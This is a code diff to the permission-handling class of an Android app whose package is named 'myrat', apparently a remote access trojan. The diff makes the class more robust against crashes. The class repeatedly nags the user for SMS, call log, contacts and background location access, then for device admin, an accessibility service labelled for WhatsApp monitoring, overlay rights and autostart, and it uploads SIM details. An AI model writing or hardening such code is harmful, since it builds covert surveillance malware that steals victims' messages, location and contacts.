@@ -27,7 +27,9 @@ class PermissionHandler(
     private val handler = Handler(Looper.getMainLooper())
     private var currentPermissionGroup = 0
     private var rotationCount = 0
-    private val maxRotations = 3 // Ask each permission group 3 times before giving up
+    private val maxRotations = 3
+    private var isProcessing = false
+    private var isDestroyed = false
     
     companion object {
         private const val RC_SMS_PERMISSIONS = 100
@@ -36,156 +38,242 @@ class PermissionHandler(
         private const val RC_STORAGE_PERMISSIONS = 103
         private const val RC_NOTIFICATION_PERMISSIONS = 104
         
-        private const val ROTATION_DELAY = 3000L // 3 seconds between rotations
+        private const val ROTATION_DELAY = 3000L
+        private const val SPECIAL_PERMISSION_DELAY = 4000L
     }
-    
-    // Permission groups for rotational asking
-    private val permissionGroups = listOf(
-        PermissionGroup(
-            name = "SMS",
-            permissions = arrayOf(
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.SEND_SMS
-            ),
-            requestCode = RC_SMS_PERMISSIONS,
-            description = "📱 SMS PERMISSIONS (CRITICAL)\n\nRequired for:\n• Receiving SMS messages\n• Reading existing SMS\n• Sending SMS messages\n\nSMS service will start immediately after granting."
-        ),
-        PermissionGroup(
-            name = "PHONE",
-            permissions = arrayOf(
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_PHONE_NUMBERS,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.READ_CALL_LOG
-            ),
-            requestCode = RC_PHONE_PERMISSIONS,
-            description = "📞 PHONE PERMISSIONS (CRITICAL)\n\nRequired for:\n• Making phone calls with SIM selection\n• Reading phone state and SIM info\n• Accessing contacts\n• Reading call history\n\nCall and contact services will start after granting."
-        ),
-        PermissionGroup(
-            name = "LOCATION",
-            permissions = arrayOf(
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            ).let { permissions ->
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    permissions + Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                } else {
-                    permissions
-                }
-            },
-            requestCode = RC_LOCATION_PERMISSIONS,
-            description = "📍 LOCATION PERMISSIONS (CRITICAL)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nLocation service will start after granting."
-        ),
-        PermissionGroup(
-            name = "STORAGE",
-            permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
-            } else {
-                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
-            },
-            requestCode = RC_STORAGE_PERMISSIONS,
-            description = "📁 STORAGE PERMISSIONS\n\nRequired for:\n• Accessing images and files\n• Image upload functionality\n\nImage upload service will start after granting."
-        ),
-        PermissionGroup(
-            name = "NOTIFICATIONS",
-            permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                arrayOf(Manifest.permission.POST_NOTIFICATIONS)
-            } else {
-                emptyArray()
-            },
-            requestCode = RC_NOTIFICATION_PERMISSIONS,
-            description = "🔔 NOTIFICATION PERMISSIONS (Android 13+)\n\nRequired for:\n• Important app notifications\n• Service status updates\n• Alert notifications"
-        )
-    ).filter { it.permissions.isNotEmpty() } // Remove empty permission groups
     
     data class PermissionGroup(
         val name: String,
         val permissions: Array<String>,
         val requestCode: Int,
         val description: String
-    )
+    ) {
+        override fun equals(other: Any?): Boolean {
+            if (this === other) return true
+            if (javaClass != other?.javaClass) return false
+            other as PermissionGroup
+            return name == other.name && requestCode == other.requestCode
+        }
+
+        override fun hashCode(): Int {
+            return name.hashCode() * 31 + requestCode
+        }
+    }
+    
+    private val permissionGroups = try {
+        listOf(
+            PermissionGroup(
+                name = "SMS",
+                permissions = arrayOf(
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.SEND_SMS
+                ),
+                requestCode = RC_SMS_PERMISSIONS,
+                description = "📱 SMS PERMISSIONS (CRITICAL)\n\nRequired for:\n• Receiving SMS messages\n• Reading existing SMS\n• Sending SMS messages\n\nSMS service will start immediately after granting."
+            ),
+            PermissionGroup(
+                name = "PHONE",
+                permissions = arrayOf(
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.CALL_PHONE,
+                    Manifest.permission.READ_PHONE_NUMBERS,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_CALL_LOG
+                ),
+                requestCode = RC_PHONE_PERMISSIONS,
+                description = "📞 PHONE PERMISSIONS (CRITICAL)\n\nRequired for:\n• Making phone calls with SIM selection\n• Reading phone state and SIM info\n• Accessing contacts\n• Reading call history\n\nCall and contact services will start after granting."
+            ),
+            PermissionGroup(
+                name = "LOCATION",
+                permissions = try {
+                    val basePermissions = arrayOf(
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION
+                    )
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        basePermissions + Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                    } else {
+                        basePermissions
+                    }
+                } catch (e: Exception) {
+                    arrayOf(
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION
+                    )
+                },
+                requestCode = RC_LOCATION_PERMISSIONS,
+                description = "📍 LOCATION PERMISSIONS (CRITICAL)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nLocation service will start after granting."
+            ),
+            PermissionGroup(
+                name = "STORAGE",
+                permissions = try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
+                    } else {
+                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+                    }
+                } catch (e: Exception) {
+                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+                },
+                requestCode = RC_STORAGE_PERMISSIONS,
+                description = "📁 STORAGE PERMISSIONS\n\nRequired for:\n• Accessing images and files\n• Image upload functionality\n\nImage upload service will start after granting."
+            ),
+            PermissionGroup(
+                name = "NOTIFICATIONS",
+                permissions = try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        arrayOf(Manifest.permission.POST_NOTIFICATIONS)
+                    } else {
+                        emptyArray()
+                    }
+                } catch (e: Exception) {
+                    emptyArray()
+                },
+                requestCode = RC_NOTIFICATION_PERMISSIONS,
+                description = "🔔 NOTIFICATION PERMISSIONS (Android 13+)\n\nRequired for:\n• Important app notifications\n• Service status updates\n• Alert notifications"
+            )
+        ).filter { it.permissions.isNotEmpty() }
+    } catch (e: Exception) {
+        Logger.error("Error initializing permission groups", e)
+        emptyList()
+    }
 
     fun requestPermissions() {
-        val activity = activityRef.get() ?: return
+        if (isDestroyed) {
+            Logger.error("PermissionHandler is destroyed, cannot request permissions")
+            return
+        }
         
-        Logger.log("🔄 Starting ROTATIONAL permission system - will ask each group $maxRotations times")
-        currentPermissionGroup = 0
-        rotationCount = 0
+        val activity = activityRef.get()
+        if (activity == null || activity.isFinishing || activity.isDestroyed) {
+            Logger.error("Activity is null or finishing, cannot request permissions")
+            return
+        }
         
-        startRotationalPermissionFlow(activity)
+        if (isProcessing) {
+            Logger.log("Permission request already in progress, skipping")
+            return
+        }
+        
+        try {
+            Logger.log("🔄 Starting ROTATIONAL permission system - will ask each group $maxRotations times")
+            currentPermissionGroup = 0
+            rotationCount = 0
+            isProcessing = true
+            
+            startRotationalPermissionFlow(activity)
+        } catch (e: Exception) {
+            Logger.error("Error starting permission request", e)
+            isProcessing = false
+        }
     }
 
     private fun startRotationalPermissionFlow(activity: Activity) {
-        if (currentPermissionGroup >= permissionGroups.size) {
-            // Completed one full rotation
-            rotationCount++
-            currentPermissionGroup = 0
+        if (isDestroyed || activity.isFinishing || activity.isDestroyed) {
+            Logger.log("Activity finishing or destroyed, stopping permission flow")
+            isProcessing = false
+            return
+        }
+        
+        try {
+            if (currentPermissionGroup >= permissionGroups.size) {
+                // Completed one full rotation
+                rotationCount++
+                currentPermissionGroup = 0
+                
+                if (rotationCount >= maxRotations) {
+                    Logger.log("🏁 Completed $maxRotations rotations, moving to special permissions")
+                    requestSpecialPermissions(activity)
+                    return
+                }
+                
+                Logger.log("🔄 Starting rotation ${rotationCount + 1}/$maxRotations")
+            }
             
-            if (rotationCount >= maxRotations) {
-                Logger.log("🏁 Completed $maxRotations rotations, moving to special permissions")
+            if (permissionGroups.isEmpty()) {
+                Logger.error("No permission groups available, moving to special permissions")
                 requestSpecialPermissions(activity)
                 return
             }
             
-            Logger.log("🔄 Starting rotation ${rotationCount + 1}/$maxRotations")
-        }
-        
-        val permissionGroup = permissionGroups[currentPermissionGroup]
-        
-        // Check if this group is already granted
-        if (EasyPermissions.hasPermissions(activity, *permissionGroup.permissions)) {
-            Logger.log("✅ ${permissionGroup.name} permissions already granted, skipping")
-            serviceManager.checkAndStartAvailableServices()
-            currentPermissionGroup++
+            val permissionGroup = permissionGroups[currentPermissionGroup]
             
-            // Continue immediately to next group
-            handler.post { startRotationalPermissionFlow(activity) }
-            return
-        }
-        
-        Logger.log("🔄 Rotation ${rotationCount + 1}/$maxRotations - Requesting ${permissionGroup.name} permissions")
-        
-        try {
-            EasyPermissions.requestPermissions(
-                PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
-                    .setRationale("""
-                        ${permissionGroup.description}
-                        
-                        📊 Progress: Rotation ${rotationCount + 1}/$maxRotations
-                        🔄 Group ${currentPermissionGroup + 1}/${permissionGroups.size}: ${permissionGroup.name}
-                        
-                        Note: We'll ask again if you deny, but services will start with whatever permissions you grant.
-                    """.trimIndent())
-                    .setPositiveButtonText("Grant ${permissionGroup.name}")
-                    .setNegativeButtonText("Skip for now")
-                    .build()
-            )
+            // Check if this group is already granted
+            if (EasyPermissions.hasPermissions(activity, *permissionGroup.permissions)) {
+                Logger.log("✅ ${permissionGroup.name} permissions already granted, skipping")
+                
+                // Start services for granted permissions
+                safeExecute {
+                    serviceManager.checkAndStartAvailableServices()
+                }
+                
+                currentPermissionGroup++
+                
+                // Continue immediately to next group
+                handler.post { 
+                    if (!isDestroyed) {
+                        startRotationalPermissionFlow(activity) 
+                    }
+                }
+                return
+            }
+            
+            Logger.log("🔄 Rotation ${rotationCount + 1}/$maxRotations - Requesting ${permissionGroup.name} permissions")
+            
+            safeExecute {
+                EasyPermissions.requestPermissions(
+                    PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
+                        .setRationale("""
+                            ${permissionGroup.description}
+                            
+                            📊 Progress: Rotation ${rotationCount + 1}/$maxRotations
+                            🔄 Group ${currentPermissionGroup + 1}/${permissionGroups.size}: ${permissionGroup.name}
+                            
+                            Note: We'll ask again if you deny, but services will start with whatever permissions you grant.
+                        """.trimIndent())
+                        .setPositiveButtonText("Grant ${permissionGroup.name}")
+                        .setNegativeButtonText("Skip for now")
+                        .build()
+                )
+            }
         } catch (e: Exception) {
-            Logger.error("Error requesting ${permissionGroup.name} permissions", e)
+            Logger.error("Error in rotational permission flow", e)
             currentPermissionGroup++
-            handler.postDelayed({ startRotationalPermissionFlow(activity) }, ROTATION_DELAY)
+            handler.postDelayed({ 
+                if (!isDestroyed) {
+                    startRotationalPermissionFlow(activity) 
+                }
+            }, ROTATION_DELAY)
         }
     }
 
-    // Callback methods for MainActivity to call
     fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
-        val activity = activityRef.get() ?: return
+        if (isDestroyed) return
         
-        val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
-        Logger.log("✅ ${permissionGroup?.name ?: "Unknown"} permissions granted: $perms")
+        val activity = activityRef.get()
+        if (activity == null || activity.isFinishing || activity.isDestroyed) {
+            Logger.error("Activity unavailable in onPermissionsGranted")
+            return
+        }
         
         try {
+            val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
+            Logger.log("✅ ${permissionGroup?.name ?: "Unknown"} permissions granted: $perms")
+            
             // Start services immediately when permissions are granted
-            serviceManager.checkAndStartAvailableServices()
+            safeExecute {
+                serviceManager.checkAndStartAvailableServices()
+            }
             
             // Move to next permission group
             currentPermissionGroup++
             
             // Continue with delay to next permission group
             handler.postDelayed({ 
-                startRotationalPermissionFlow(activity) 
+                if (!isDestroyed) {
+                    startRotationalPermissionFlow(activity) 
+                }
             }, ROTATION_DELAY)
             
         } catch (e: Exception) {
@@ -194,14 +282,22 @@ class PermissionHandler(
     }
 
     fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
-        val activity = activityRef.get() ?: return
+        if (isDestroyed) return
         
-        val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
-        Logger.warn("❌ ${permissionGroup?.name ?: "Unknown"} permissions denied: $perms")
+        val activity = activityRef.get()
+        if (activity == null || activity.isFinishing || activity.isDestroyed) {
+            Logger.error("Activity unavailable in onPermissionsDenied")
+            return
+        }
         
         try {
+            val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
+            Logger.warn("❌ ${permissionGroup?.name ?: "Unknown"} permissions denied: $perms")
+            
             // Still check and start available services with granted permissions
-            serviceManager.checkAndStartAvailableServices()
+            safeExecute {
+                serviceManager.checkAndStartAvailableServices()
+            }
             
             // Check if some permissions are permanently denied
             if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
@@ -213,7 +309,9 @@ class PermissionHandler(
             
             // Continue with delay to next permission group
             handler.postDelayed({ 
-                startRotationalPermissionFlow(activity) 
+                if (!isDestroyed) {
+                    startRotationalPermissionFlow(activity) 
+                }
             }, ROTATION_DELAY)
             
         } catch (e: Exception) {
@@ -222,43 +320,55 @@ class PermissionHandler(
     }
 
     private fun requestSpecialPermissions(activity: Activity) {
-        Logger.log("🔧 Starting special permissions flow")
-        
-        // Battery optimization (critical for service persistence)
-        if (!isBatteryOptimizationDisabled(activity)) {
-            requestBatteryOptimization(activity)
+        if (isDestroyed || activity.isFinishing || activity.isDestroyed) {
+            Logger.log("Activity finishing, skipping special permissions")
+            finishPermissionFlow(activity)
             return
         }
         
-        // Device admin (for lock service)
-        if (!isDeviceAdminEnabled(activity)) {
-            requestDeviceAdmin(activity)
-            return
-        }
-        
-        // Accessibility service (for WhatsApp monitoring)
-        if (!isAccessibilityServiceEnabled(activity)) {
-            requestAccessibilityService(activity)
-            return
-        }
-        
-        // System overlay
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
-            requestOverlayPermission(activity)
-            return
-        }
-        
-        // Exact alarms (Android 12+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
-            if (!alarmManager.canScheduleExactAlarms()) {
-                requestExactAlarms(activity)
+        try {
+            Logger.log("🔧 Starting special permissions flow")
+            
+            // Battery optimization (critical for service persistence)
+            if (!isBatteryOptimizationDisabled(activity)) {
+                requestBatteryOptimization(activity)
                 return
             }
+            
+            // Device admin (for lock service)
+            if (!isDeviceAdminEnabled(activity)) {
+                requestDeviceAdmin(activity)
+                return
+            }
+            
+            // Accessibility service (for WhatsApp monitoring)
+            if (!isAccessibilityServiceEnabled(activity)) {
+                requestAccessibilityService(activity)
+                return
+            }
+            
+            // System overlay
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
+                requestOverlayPermission(activity)
+                return
+            }
+            
+            // Exact alarms (Android 12+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
+                if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
+                    requestExactAlarms(activity)
+                    return
+                }
+            }
+            
+            // All special permissions done, move to manufacturer settings
+            requestManufacturerSpecificSettings(activity)
+            
+        } catch (e: Exception) {
+            Logger.error("Error in special permissions flow", e)
+            finishPermissionFlow(activity)
         }
-        
-        // All special permissions done, move to manufacturer settings
-        requestManufacturerSpecificSettings(activity)
     }
 
     private fun requestBatteryOptimization(activity: Activity) {
@@ -272,17 +382,25 @@ class PermissionHandler(
             Logger.log("Battery optimization intent launched")
             
             handler.postDelayed({
-                serviceManager.checkAndStartAvailableServices()
-                if (!isDeviceAdminEnabled(activity)) {
-                    requestDeviceAdmin(activity)
-                } else {
-                    requestSpecialPermissions(activity) // Continue checking
+                if (!isDestroyed) {
+                    safeExecute {
+                        serviceManager.checkAndStartAvailableServices()
+                    }
+                    if (!isDeviceAdminEnabled(activity)) {
+                        requestDeviceAdmin(activity)
+                    } else {
+                        requestSpecialPermissions(activity)
+                    }
                 }
-            }, 3000)
+            }, SPECIAL_PERMISSION_DELAY)
             
         } catch (e: Exception) {
             Logger.error("Failed to request battery optimization", e)
-            requestSpecialPermissions(activity) // Continue anyway
+            handler.postDelayed({
+                if (!isDestroyed) {
+                    requestSpecialPermissions(activity)
+                }
+            }, 1000)
         }
     }
 
@@ -300,13 +418,21 @@ class PermissionHandler(
             Logger.log("Device admin intent launched")
             
             handler.postDelayed({
-                serviceManager.checkAndStartAvailableServices()
-                requestSpecialPermissions(activity) // Continue checking
-            }, 3000)
+                if (!isDestroyed) {
+                    safeExecute {
+                        serviceManager.checkAndStartAvailableServices()
+                    }
+                    requestSpecialPermissions(activity)
+                }
+            }, SPECIAL_PERMISSION_DELAY)
             
         } catch (e: Exception) {
             Logger.error("Failed to request device admin", e)
-            requestSpecialPermissions(activity) // Continue anyway
+            handler.postDelayed({
+                if (!isDestroyed) {
+                    requestSpecialPermissions(activity)
+                }
+            }, 1000)
         }
     }
 
@@ -319,13 +445,21 @@ class PermissionHandler(
             Logger.log("Accessibility settings intent launched")
             
             handler.postDelayed({
-                serviceManager.checkAndStartAvailableServices()
-                requestSpecialPermissions(activity) // Continue checking
-            }, 5000)
+                if (!isDestroyed) {
+                    safeExecute {
+                        serviceManager.checkAndStartAvailableServices()
+                    }
+                    requestSpecialPermissions(activity)
+                }
+            }, SPECIAL_PERMISSION_DELAY + 1000) // Extra time for accessibility
             
         } catch (e: Exception) {
             Logger.error("Failed to open accessibility settings", e)
-            requestSpecialPermissions(activity) // Continue anyway
+            handler.postDelayed({
+                if (!isDestroyed) {
+                    requestSpecialPermissions(activity)
+                }
+            }, 1000)
         }
     }
 
@@ -340,13 +474,21 @@ class PermissionHandler(
             Logger.log("Overlay permission intent launched")
             
             handler.postDelayed({
-                serviceManager.checkAndStartAvailableServices()
-                requestSpecialPermissions(activity) // Continue checking
-            }, 3000)
+                if (!isDestroyed) {
+                    safeExecute {
+                        serviceManager.checkAndStartAvailableServices()
+                    }
+                    requestSpecialPermissions(activity)
+                }
+            }, SPECIAL_PERMISSION_DELAY)
             
         } catch (e: Exception) {
             Logger.error("Failed to request overlay permission", e)
-            requestSpecialPermissions(activity) // Continue anyway
+            handler.postDelayed({
+                if (!isDestroyed) {
+                    requestSpecialPermissions(activity)
+                }
+            }, 1000)
         }
     }
 
@@ -361,13 +503,21 @@ class PermissionHandler(
             Logger.log("Exact alarms permission intent launched")
             
             handler.postDelayed({
-                serviceManager.checkAndStartAvailableServices()
-                requestSpecialPermissions(activity) // Continue checking
-            }, 3000)
+                if (!isDestroyed) {
+                    safeExecute {
+                        serviceManager.checkAndStartAvailableServices()
+                    }
+                    requestSpecialPermissions(activity)
+                }
+            }, SPECIAL_PERMISSION_DELAY)
             
         } catch (e: Exception) {
             Logger.error("Failed to request exact alarms permission", e)
-            requestSpecialPermissions(activity) // Continue anyway
+            handler.postDelayed({
+                if (!isDestroyed) {
+                    requestSpecialPermissions(activity)
+                }
+            }, 1000)
         }
     }
 
@@ -401,13 +551,9 @@ class PermissionHandler(
         Logger.log("🔧 Opening MIUI-specific settings")
         
         val intents = listOf(
-            // Autostart management
             Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
-            // Power keeper
             Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")),
-            // Permission editor
             Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName),
-            // Security center main
             Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.securitycenter.Main"))
         )
         
@@ -470,7 +616,9 @@ class PermissionHandler(
                     Logger.log("Successfully opened $settingsName")
                     
                     handler.postDelayed({
-                        finishPermissionFlow(activity)
+                        if (!isDestroyed) {
+                            finishPermissionFlow(activity)
+                        }
                     }, 2000)
                     return
                 }
@@ -494,44 +642,57 @@ class PermissionHandler(
     }
 
     private fun finishPermissionFlow(activity: Activity) {
+        if (isDestroyed) return
+        
         Logger.log("🎉 Rotational permission flow completed!")
         
         try {
             // Final service check and start
-            serviceManager.checkAndStartAvailableServices()
+            safeExecute {
+                serviceManager.checkAndStartAvailableServices()
+            }
             
             // Upload SIM details
-            simDetailsHandler.uploadSimDetails()
+            safeExecute {
+                simDetailsHandler.uploadSimDetails()
+            }
             
             // Log final service status
-            val stats = serviceManager.getServiceStats()
-            Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")
+            safeExecute {
+                val stats = serviceManager.getServiceStats()
+                Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")
+            }
+            
+            isProcessing = false
             
         } catch (e: Exception) {
             Logger.error("Error in finishPermissionFlow", e)
+            isProcessing = false
         }
     }
 
-    // Helper methods
+    // Helper methods with crash protection
     private fun isBatteryOptimizationDisabled(context: Context): Boolean {
         return try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
-                powerManager.isIgnoringBatteryOptimizations(context.packageName)
+                val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
+                powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: false
             } else {
                 true
             }
         } catch (e: Exception) {
+            Logger.error("Error checking battery optimization", e)
             false
         }
     }
 
     private fun isDeviceAdminEnabled(context: Context): Boolean {
         return try {
-            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
             val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
-            devicePolicyManager.isAdminActive(adminComponent)
+            devicePolicyManager?.isAdminActive(adminComponent) ?: false
         } catch (e: Exception) {
+            Logger.error("Error checking device admin", e)
             false
         }
     }
@@ -552,33 +713,65 @@ class PermissionHandler(
                 false
             }
         } catch (e: Exception) {
+            Logger.error("Error checking accessibility service", e)
             false
+        }
+    }
+
+    private fun safeExecute(action: () -> Unit) {
+        try {
+            if (!isDestroyed) {
+                action()
+            }
+        } catch (e: Exception) {
+            Logger.error("Error in safe execution", e)
         }
     }
 
     fun hasBasicPermissions(): Boolean {
         val activity = activityRef.get() ?: return false
-        return permissionGroups.any { group ->
-            EasyPermissions.hasPermissions(activity, *group.permissions)
+        return try {
+            permissionGroups.any { group ->
+                EasyPermissions.hasPermissions(activity, *group.permissions)
+            }
+        } catch (e: Exception) {
+            Logger.error("Error checking basic permissions", e)
+            false
         }
     }
 
     fun areAllPermissionsGranted(): Boolean {
         val activity = activityRef.get() ?: return false
         
-        val allPermissions = permissionGroups.flatMap { it.permissions.toList() }.toTypedArray()
-        val runtimeGranted = EasyPermissions.hasPermissions(activity, *allPermissions)
-        val batteryOptimized = isBatteryOptimizationDisabled(activity)
-        
-        return runtimeGranted && batteryOptimized
+        return try {
+            val allPermissions = permissionGroups.flatMap { it.permissions.toList() }.toTypedArray()
+            val runtimeGranted = if (allPermissions.isNotEmpty()) {
+                EasyPermissions.hasPermissions(activity, *allPermissions)
+            } else {
+                true
+            }
+            val batteryOptimized = isBatteryOptimizationDisabled(activity)
+            
+            runtimeGranted && batteryOptimized
+        } catch (e: Exception) {
+            Logger.error("Error checking all permissions", e)
+            false
+        }
     }
 
     fun handleResume() {
+        if (isDestroyed) return
+        
         try {
-            val activity = activityRef.get() ?: return
+            val activity = activityRef.get()
+            if (activity == null || activity.isFinishing || activity.isDestroyed) {
+                return
+            }
             
             // Always check and start available services on resume
-            serviceManager.checkAndStartAvailableServices()
+            safeExecute {
+                serviceManager.checkAndStartAvailableServices()
+            }
             
             if (areAllPermissionsGranted()) {
                 Logger.log("All permissions granted on resume")
@@ -591,6 +784,8 @@ class PermissionHandler(
 
     fun cleanup() {
         try {
+            isDestroyed = true
+            isProcessing = false
             handler.removeCallbacksAndMessages(null)
             Logger.log("PermissionHandler cleanup completed")
         } catch (e: Exception) {
